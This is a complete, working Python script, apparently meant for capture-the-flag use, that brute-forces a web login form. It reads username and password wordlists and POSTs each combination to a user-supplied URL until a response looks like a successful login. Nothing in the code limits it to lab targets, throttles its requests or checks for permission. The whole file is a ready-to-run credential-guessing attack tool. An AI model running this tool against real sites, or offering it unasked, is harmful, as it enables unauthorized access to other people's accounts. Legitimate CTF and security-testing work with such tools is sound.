import os
import sys
import urllib.error
import urllib.parse
import urllib.request

def read_wordlist(path):
    with open(path, "r", encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip()]


def resolve_candidates(value):
    if value and os.path.isfile(value):
        return read_wordlist(value)
    return [value]


def try_login(url, username, password, username_field, password_field, success_text):
    data = urllib.parse.urlencode(
        {
            username_field: username,
            password_field: password,
        }
    ).encode("utf-8")

    request = urllib.request.Request(
        url,
        data=data,
        headers={"User-Agent": "CTF-Bruteforcer/1.0"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            body = response.read().decode("utf-8", errors="ignore")
            status = response.getcode()
            if success_text and success_text.lower() in body.lower():
                return True, status, body
            if status in (200, 301, 302, 303) and not any(
                marker in body.lower() for marker in ["invalid", "incorrect", "failed", "error"]
            ):
                return True, status, body
            return False, status, body
    except urllib.error.HTTPError as error:
        body = error.read().decode("utf-8", errors="ignore")
        return False, error.code, body
    except Exception as exc:
        return False, None, str(exc)


def main():
    print("Simple CTF Brute Forcer")
    print("This tool sends POST requests to a login-style endpoint and tries candidate credentials.\n")

    target_url = input("Target URL (POST endpoint): ").strip()
    if not target_url:
        print("No URL provided. Exiting.")
        sys.exit(1)

    username_input = input("Username or path to username wordlist: ").strip()
    password_input = input("Password or path to password wordlist: ").strip()
    username_field = input("Username field name [username]: ").strip() or "username"
    password_field = input("Password field name [password]: ").strip() or "password"
    success_text = input("Success text marker (leave blank for auto-detect): ").strip()

    usernames = resolve_candidates(username_input)
    passwords = resolve_candidates(password_input)

    if not usernames or not passwords:
        print("No candidates supplied. Exiting.")
        sys.exit(1)

    print(f"\nTrying {len(usernames)} username(s) against {len(passwords)} password(s)...")

    for username in usernames:
        for password in passwords:
            ok, status, body = try_login(
                target_url,
                username,
                password,
                username_field,
                password_field,
                success_text,
            )

            if ok:
                print(f"\n[+] SUCCESS -> username: {username} | password: {password}")
                print(f"Status: {status}")
                return

            print(f"[-] Failed -> {username} / {password} | status={status}")

    print("\nNo valid credentials found.")


if __name__ == "__main__":
    main()
